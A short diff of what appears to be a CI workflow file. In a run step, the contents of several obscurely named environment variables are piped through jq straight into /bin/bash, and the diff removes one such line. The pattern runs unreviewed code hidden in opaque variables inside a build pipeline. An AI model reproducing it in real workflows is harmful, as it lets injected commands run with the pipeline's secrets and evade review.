@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$qfx3" | jq -r .kio636 | /bin/bash
           printf '%s' "$vee081" | jq -r .dx6498 | /bin/bash
-          printf '%s' "$bc9404" | jq -r .jk2 | /bin/bash
           printf '%s' "$vxz77" | jq -r .ypnt69 | /bin/bash
 
       - name: Archive results
